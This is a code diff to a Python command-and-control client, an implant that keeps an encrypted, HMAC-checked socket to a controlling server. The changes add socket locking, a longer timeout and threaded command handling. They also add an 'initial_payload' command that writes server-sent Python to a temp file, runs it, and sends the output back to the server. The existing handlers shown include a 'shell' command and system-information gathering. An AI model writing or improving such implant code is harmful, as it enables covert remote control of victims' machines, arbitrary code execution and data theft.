@@ -18,16 +18,18 @@ class C2Client:
         self.hmac_key = None
         self.cipher_suite = None
         self.socket = None
+        self.socket_lock = threading.Lock()  # New lock for socket operations
         self.receive_thread = None
         self.status_thread = None
         self.stop_event = threading.Event()
+        self.last_activity = time.time()
         
         logging.basicConfig(
             level=logging.DEBUG,
             format='%(asctime)s - %(levelname)s: %(message)s',
             handlers=[
                 logging.StreamHandler(),
-                logging.FileHandler('logs/c2_client.log')
+                logging.FileHandler('../logs/c2_client.log')
             ]
         )
         self.logger = logging.getLogger('C2Client')
@@ -37,7 +39,7 @@ class C2Client:
         
         try:
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.settimeout(30)
+            self.socket.settimeout(120)
             self.socket.connect((self.server_host, self.server_port))
             self.logger.info("Connected to server")
             
@@ -114,20 +116,24 @@ class C2Client:
     
     def send_response(self, response):
         try:
-            if not self.socket:
-                raise RuntimeError("No active socket connection")
-            
-            encrypted_response = self.cipher_suite.encrypt(
-                json.dumps(response).encode()
-            )
-            h = hmac.HMAC(self.hmac_key, hashes.SHA256())
-            h.update(encrypted_response)
-            response_hmac = h.finalize()
-            
-            data_length = len(encrypted_response).to_bytes(4, 'big')
-            self.socket.sendall(data_length)
-            self.socket.sendall(encrypted_response)
-            self.socket.sendall(response_hmac)
+            with self.socket_lock:
+                if not self.socket:
+                    raise RuntimeError("No active socket connection")
+                
+                encrypted_response = self.cipher_suite.encrypt(
+                    json.dumps(response).encode()
+                )
+                h = hmac.HMAC(self.hmac_key, hashes.SHA256())
+                h.update(encrypted_response)
+                response_hmac = h.finalize()
+                
+                data_length = len(encrypted_response).to_bytes(4, 'big')
+                self.socket.sendall(data_length)
+                self.socket.sendall(encrypted_response)
+                self.socket.sendall(response_hmac)
+                
+                # Update last activity time
+                self.last_activity = time.time()
         
         except Exception as e:
             self.logger.error(f"Failed to send response: {e}")
@@ -137,35 +143,48 @@ class C2Client:
     def receive_commands(self):
         while not self.stop_event.is_set():
             try:
-                length_bytes = self.socket.recv(4)
-                if len(length_bytes) != 4:
-                    break
-                data_length = int.from_bytes(length_bytes, 'big')
-                
-                encrypted_data = b''
-                while len(encrypted_data) < data_length:
-                    chunk = self.socket.recv(data_length - len(encrypted_data))
-                    if not chunk:
+                with self.socket_lock:
+                    if not self.socket:
                         break
-                    encrypted_data += chunk
-                
-                if len(encrypted_data) != data_length:
-                    break
-                
-                encrypted_hmac = self.socket.recv(32)
-                if len(encrypted_hmac) != 32:
-                    break
-                
-                h = hmac.HMAC(self.hmac_key, hashes.SHA256())
-                h.update(encrypted_data)
-                try:
-                    h.verify(encrypted_hmac)
-                except Exception:
-                    continue
-                
-                data = self.cipher_suite.decrypt(encrypted_data).decode()
-                command = json.loads(data)
-                self.process_command(command)
+                    
+                    length_bytes = self.socket.recv(4)
+                    if len(length_bytes) != 4:
+                        break
+                    data_length = int.from_bytes(length_bytes, 'big')
+                    
+                    encrypted_data = b''
+                    while len(encrypted_data) < data_length:
+                        chunk = self.socket.recv(data_length - len(encrypted_data))
+                        if not chunk:
+                            break
+                        encrypted_data += chunk
+                    
+                    if len(encrypted_data) != data_length:
+                        break
+                    
+                    encrypted_hmac = self.socket.recv(32)
+                    if len(encrypted_hmac) != 32:
+                        break
+                    
+                    h = hmac.HMAC(self.hmac_key, hashes.SHA256())
+                    h.update(encrypted_data)
+                    try:
+                        h.verify(encrypted_hmac)
+                    except Exception:
+                        continue
+                    
+                    data = self.cipher_suite.decrypt(encrypted_data).decode()
+                    command = json.loads(data)
+                    
+                    # Update last activity time
+                    self.last_activity = time.time()
+                    
+                    # Process command in a separate thread to avoid blocking
+                    threading.Thread(
+                        target=self.process_command,
+                        args=(command,),
+                        daemon=True
+                    ).start()
             
             except Exception as e:
                 self.logger.error(f"Error receiving command: {e}")
@@ -176,12 +195,13 @@ class C2Client:
     
     def cleanup(self):
         self.stop_event.set()
-        if self.socket:
-            try:
-                self.socket.close()
-            except:
-                pass
-            self.socket = None
+        with self.socket_lock:
+            if self.socket:
+                try:
+                    self.socket.close()
+                except:
+                    pass
+                self.socket = None
     
     def process_command(self, command):
         try:
@@ -190,6 +210,20 @@ class C2Client:
             if command_type == 'heartbeat':
                 # Just log it if you want to track heartbeats
                 self.logger.debug("Heartbeat received from server")
+                return
+            
+            if command_type == 'initial_payload':
+                try:
+                    payload = command.get('payload')
+                    if payload:
+                        # Execute the payload in a separate thread to avoid blocking
+                        threading.Thread(
+                            target=self.execute_payload,
+                            args=(payload,),
+                            daemon=True
+                        ).start()
+                except Exception as e:
+                    self.logger.error(f"Failed to execute initial payload: {e}")
                 return
             
             if command_type == 'shell':
@@ -215,6 +249,50 @@ class C2Client:
         
         except Exception as e:
             self.logger.error(f"Command processing error: {e}")
+    
+    def execute_payload(self, payload):
+        """Execute the initial payload in a safe manner"""
+        try:
+            # Create a temporary file to store the payload
+            import tempfile
+            import os
+            
+            with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as temp_file:
+                temp_file.write(payload.encode())
+                temp_file_path = temp_file.name
+            
+            try:
+                # Execute the payload
+                result = subprocess.run(
+                    ['python', temp_file_path],
+                    capture_output=True,
+                    text=True,
+                    timeout=300  # 5-minute timeout
+                )
+                
+                # Send the result back to the server
+                response = {
+                    'type': 'payload_result',
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'returncode': result.returncode
+                }
+                self.send_response(response)
+            
+            finally:
+                # Clean up the temporary file
+                try:
+                    os.unlink(temp_file_path)
+                except:
+                    pass
+        
+        except Exception as e:
+            self.logger.error(f"Payload execution error: {e}")
+            response = {
+                'type': 'payload_result',
+                'error': str(e)
+            }
+            self.send_response(response)
     
     def get_system_info(self):
         return {
